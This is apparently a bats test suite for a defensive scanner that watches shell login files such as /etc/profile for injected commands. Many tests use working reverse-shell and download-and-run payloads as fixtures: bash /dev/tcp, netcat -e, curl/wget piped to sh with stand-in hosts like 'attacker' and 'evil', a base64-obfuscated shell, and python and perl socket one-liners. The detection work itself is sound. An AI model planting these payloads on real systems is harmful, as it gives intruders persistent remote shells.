#!/usr/bin/env bats
# L2 bats functional tests for the shell-init-watchdog scan script.
#
# The system shell-init files (/etc/profile, /etc/bash.bashrc, /etc/zsh/*,
# /etc/profile.d/*.sh, the root dotfiles, …) are SOURCED for every login
# shell — a per-login exec surface (T1546). This watchdog is a pure
# content-pattern scanner: a shell-init file containing a command-injection /
# reverse-shell / obfuscation pattern is alert (event
# shell_init_suspicious_pattern). Ownership is covered by adjacent watchdogs;
# this one focuses on the high-signal content patterns.
#
# Run with: bats packaging/test/L2-shell-init-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd/shell-init-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PROFILE_F="${TMP}/profile"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SHELLINIT_PROFILE="${PROFILE:-report}" \
    SELFDEF_SHELLINIT_BASELINE="${BASELINE}" \
    SELFDEF_SHELLINIT_FILES="${FILES_V:-$PROFILE_F}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# /etc/profile\nexport EDITOR=vi\numask 022\n' > "${PROFILE_F}"
}

@test "benign shell-init, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged shell-init on second run → ok / shell_init_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in shell-init → alert / shell_init_suspicious_pattern" {
    seed_benign
    run_wd
    printf '# /etc/profile\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_suspicious_pattern"'
    cap | grep -q '"severity":"alert"'
}

@test "a writable-root invocation in shell-init → alert" {
    seed_benign
    run_wd
    printf '# /etc/profile\n/tmp/.bootstrap\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign shell-init change → warn / shell_init_changed" {
    seed_benign
    run_wd
    printf '# /etc/profile\nexport EDITOR=vim\numask 027\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"shell_init_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign shell-init is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious shell-init" {
    seed_benign
    run_wd
    printf '# /etc/profile\ncurl http://evil/p|sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — shell-init inventory enumerates per-login exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell variant 1): /dev/tcp/<ip>/<port> bash reverse → alert" {
    seed_benign
    run_wd
    printf 'bash -i >& /dev/tcp/192.168.0.1/1234 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell variant 2): netcat reverse shell → alert" {
    seed_benign
    run_wd
    printf 'nc 10.0.0.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh): the canonical attacker bootstrap pattern → alert" {
    seed_benign
    run_wd
    printf 'curl http://attacker/script.sh | bash\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant → alert" {
    seed_benign
    run_wd
    printf 'wget -qO- http://attacker/payload | sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): the obfuscation pattern → alert" {
    # Common attacker obfuscation: base64-encoded payload piped
    # to sh. Locks the pattern is in the denylist.
    seed_benign
    run_wd
    printf 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d | bash\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (writable-tmp piped exec): `; /tmp/.dotted` after a command chain → alert" {
    # The script's writable-location regex requires start-of-line
    # OR after `;|&` whitespace — locks the "chained-after-command"
    # case (e.g., `cmd1 && /tmp/.payload`) which is how an attacker
    # piggybacks on an existing line.
    seed_benign
    run_wd
    printf 'echo hello; /tmp/.bootstrap\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (writable-var-tmp exec): a /var/tmp exec → alert too" {
    seed_benign
    run_wd
    printf '/var/tmp/.callback\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-shell-init -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): shell-init-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 per-login exec persistence — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"shell_init_suspicious_pattern"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # /etc/profile is /bin/sh; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# /etc/profile\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport EDITOR=vi\n' > "${PROFILE_F}"
    run_wd
    ! cap | grep -q '"event":"shell_init_suspicious_pattern"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: /etc/profile + /etc/bash.bashrc + /etc/zsh/zshrc + /etc/profile.d/*.sh axes — injection in ANY → alert)" {
    # Shell-init has 4 main file families. Lock multi-file axis.
    PROFILE_F2="${TMP}/bash.bashrc"
    seed_benign
    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in bash.bashrc.
    printf '# /etc/bash.bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F2}"
    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (/dev/shm tmpfs writable-root exec → alert)" {
    # /dev/shm is tmpfs world-writable. Lock coverage alongside
    # /tmp + /var/tmp + /home writable-root family.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/dev/shm/.callback\n' > "${PROFILE_F}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (zsh family axis: /etc/zsh/zshrc + /etc/zsh/zprofile — zsh shell-init also scanned)" {
    # Sister axis to bash family scan. zsh-specific shell-init
    # files are equally per-login exec surfaces.
    ZSHRC="${TMP}/zshrc"
    ZPROFILE="${TMP}/zprofile"
    seed_benign
    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# /etc/zsh/zshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ZSHRC}"
    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in shell-init: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. Shell-init files (/etc/profile,
    # /etc/bash.bashrc, /etc/zsh/*, /etc/profile.d/*.sh, root
    # dotfiles) source on every interactive login — per-login exec
    # persistence surface (T1546). Sister-vector to bash-completion
    # + csh-config + fish-config on the per-login source surface
    # family.
    seed_benign
    run_wd
    printf 'nc -e /bin/sh 1.1.1.1 4444\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on shell-init surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the shell-init
    # per-login source surface (T1546.004 — /etc/profile +
    # /etc/bash.bashrc sourced into every interactive login).
    seed_benign
    run_wd
    printf 'python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on shell-init surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp shell-init
    # rev-shell variants already locked. Perl on every Debian/
    # Ubuntu host. Locks perl axis on T1546.004 shell-init per-
    # login source surface — /etc/profile + /etc/bash.bashrc
    # sourced on every interactive login.
    seed_benign
    run_wd
    printf 'perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (baseline re-establish on operator out-of-band deletion: missing baseline re-creates cleanly + emits baseline_initial)" {
    # Sister to brain-wide baseline-re-establish INVARIANTs.
    # State-resilience on T1546.004 shell-init per-login source
    # surveillance.
    seed_benign
    run_wd                                              # establishes baseline
    [ -f "${BASELINE}" ]
    rm -f "${BASELINE}"                                  # operator wipe
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # must re-establish
    [ -f "${BASELINE}" ]
    cap | grep -qE '"event":"baseline_initial"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The shell-init-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers (alertmanager / log aggregator routes)
    # branch on the literal severity string; an out-of-set
    # value silently falls through routing and the operator
    # never sees the alert. Locks parser contract on the
    # T1546.004 shell-init detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok path
    printf '; nc 1.1.1.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
    run_wd                                              # alert path
    printf '# benign trailing comment\nexport PATH=/usr/bin:$PATH\n' > "${PROFILE_F}"
    run_wd                                              # warn path (benign change)
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: shell-init-watchdog NEVER deletes shell-init files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # shell-init-watchdog DETECTS T1546.004 shell-init per-login
    # source persistence via injection but MUST NEVER emit rm/
    # unlink commands to auto-clean the file. The detected
    # injection may be operator-legitimate (custom PATH export,
    # site-specific umask, tooling activation) — silent auto-
    # delete would destroy operator baseline state AND
    # forensic evidence chain. Surveillance, never remediation.
    # Locks anti-data-loss contract on the shell-init
    # surveillance substrate.
    seed_benign
    printf '; bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
    run_wd
    # Shell-init file MUST remain on disk after detection.
    [ -f "${PROFILE_F}" ]
    # Watchdog source must never emit rm/unlink/find -delete on
    # shell-init paths.
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(PROFILE_F|PROFILE|SHELL_INIT|FILE|file)' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # shell-init-watchdog runs ON the timer's scheduled fire —
    # scans /etc/profile + /etc/bash.bashrc + /etc/profile.d for
    # injection patterns, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the shell-init-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd/selfdef-shell-init.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. shell-init-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # shell-init-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # shell-init-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'shell-init-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
